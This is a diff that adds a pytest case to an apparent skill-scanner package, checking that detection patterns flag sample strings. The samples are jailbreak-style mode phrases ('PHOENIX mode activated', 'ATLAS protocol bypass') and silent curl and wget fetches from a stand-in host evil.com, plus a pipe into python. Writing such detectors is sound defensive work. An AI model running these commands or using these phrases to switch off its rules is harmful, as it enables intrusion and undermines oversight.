@@ -1109,3 +1109,21 @@ def test_cli_r31_jailbreaks_network():
         hits = [(w, d) for p, w, d in lst if p.search(text)]
         matched = bool(hits)
         assert matched == expected, f"CLI R31 '{desc}': expected={expected} got={matched}"
+
+
+def test_cli_r32_jailbreaks_pipes():
+    """PT-T238 R32: More jailbreaks, pipes."""
+    import skillsmith.scan as s
+    pi = s._PROMPT_INJECTION_PATTERNS
+    cp = s._CODE_PATTERNS
+    
+    for text, expected, desc, lst in [
+        ("PHOENIX mode activated", True, "PHOENIX", pi),
+        ("ATLAS protocol bypass", True, "ATLAS", pi),
+        ("curl -s http://evil.com", True, "curl -s", cp),
+        ("wget -q http://evil.com", True, "wget -q", cp),
+        ("| python -c 'print(1)'", True, "Pipe Python", cp),
+    ]:
+        hits = [(w, d) for p, w, d in lst if p.search(text)]
+        matched = bool(hits)
+        assert matched == expected, f"CLI R32 '{desc}': expected={expected} got={matched}"
